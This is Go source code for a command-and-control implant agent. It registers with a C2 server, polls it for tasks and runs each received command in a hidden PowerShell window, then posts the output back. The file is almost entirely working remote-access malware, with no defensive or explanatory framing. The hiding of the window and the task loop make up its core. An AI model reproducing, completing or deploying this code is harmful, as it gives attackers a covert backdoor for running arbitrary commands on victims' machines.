package main

import (
	"fmt"
	"runtime"
	"os/exec"
	"net"
	"strings"
	"net/http"
    "time"
	"encoding/json"
	"bytes"
	"syscall"
)

type Agent struct {
    LocalIP       string
    ServerIP     string
    ServerPort    int
	CallbackInterval time.Duration
	Client        *http.Client
}

type Task struct {
	Action string `json:"action"`
	Command string `json:"command"`
	Filename string `json:"filename"`
	TaskID json.Number `json:"task_id"`
}

type Result struct {
	AgentID string `json:"agent_id"`
	TaskID string `json:"task_id"`
	Result string `json:"result"`
	ReturnCode int `json:"returncode"`
}

func getLocalIP() string {
	if runtime.GOOS == "linux" {
		cmd := exec.Command("bash", "-c", "hostname -I | awk '{print $1}'")
		out, err := cmd.Output()
		if err != nil {
			return "?.?.?.?" // Fallback if command fails
		}
		return strings.TrimSpace(string(out))
	} else {
		addrs, err := net.InterfaceAddrs()
		if err != nil {
			return "?.?.?.?"
		}
		for _, address := range addrs {
			// makes sure to filter out loopback addresses
			if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
		return "?.?.?.?"
	}
}

func (agent *Agent) Register() error {
    data := map[string]string{
        "agent_id": agent.LocalIP,
    }

    jsonData, err := json.Marshal(data)
    if err != nil {
        return fmt.Errorf("failed to marshal JSON: %w", err)
    }

    req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
    if err != nil {
        return fmt.Errorf("failed to create request: %w", err)
    }
    req.Header.Set("Content-Type", "application/json")

    resp, err := agent.Client.Do(req)
    if err != nil {
        return fmt.Errorf("failed to send request: %w", err)
    }
    defer resp.Body.Close()

    if resp.StatusCode != 201 && resp.StatusCode != 200 {
        return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
    }

    return nil
}

func (agent *Agent) HandleTask(task Task) (Result, error) {
	var result Result
	result.AgentID = agent.LocalIP
	result.TaskID = task.TaskID.String()

	switch task.Action {
	case "command":
		var cmd *exec.Cmd
		cmd = exec.Command("powershell", "-WindowStyle", "Hidden","-Command", task.Command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true,}
		out, err := cmd.CombinedOutput()
		if err != nil {
			result.Result = string(out)
			result.ReturnCode = cmd.ProcessState.ExitCode()
		} else {
			result.Result = string(out)
			result.ReturnCode = 0
		}
	default:
		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
	}

	return result, nil
}

func main(){
	agent := Agent{
        LocalIP:  getLocalIP(),
        ServerIP: "127.0.0.1",
        ServerPort: 80,
		CallbackInterval: 60 * time.Second,
		Client: &http.Client{
            Timeout: 10 * time.Second,
        },
    }

	// Attempt to register the agent with C2 server until successful
	for {
		err := agent.Register()
		if err != nil {
			fmt.Println("Error registering agent:", err)
		}
		break
	}

	// Main loop to poll server for tasks
	for {
		url := fmt.Sprintf("http://%s:%d/tasks", agent.ServerIP, agent.ServerPort)
		ip_json := map[string]string{"agent_id": agent.LocalIP}
		jsonData, err := json.Marshal(ip_json)
		if err != nil {
			fmt.Println("Error marshaling JSON:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Println("Error creating request:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		resp,err := agent.Client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		

		if resp.StatusCode == 418 {
            agent.Register()
            continue
        }

        if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
            fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
            time.Sleep(agent.CallbackInterval)
            continue
        } else if resp.StatusCode == 204 {
            // No tasks
            time.Sleep(agent.CallbackInterval)
            continue
        }

		var task Task
		err = json.NewDecoder(resp.Body).Decode(&task)
		if err != nil {
			fmt.Println("Error decoding JSON:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		result, err := agent.HandleTask(task)
		if err != nil {
			fmt.Println("Error handling task:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		// Send the result back to the server
		url = fmt.Sprintf("http://%s:%d/results", agent.ServerIP, agent.ServerPort)
		jsonData, err = json.Marshal(result)
		if err != nil {
			fmt.Println("Error marshaling JSON:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		req, err = http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Println("Error creating request:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		resp, err = agent.Client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
		if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
			fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
			time.Sleep(agent.CallbackInterval * time.Second)
			continue
		}
	}
}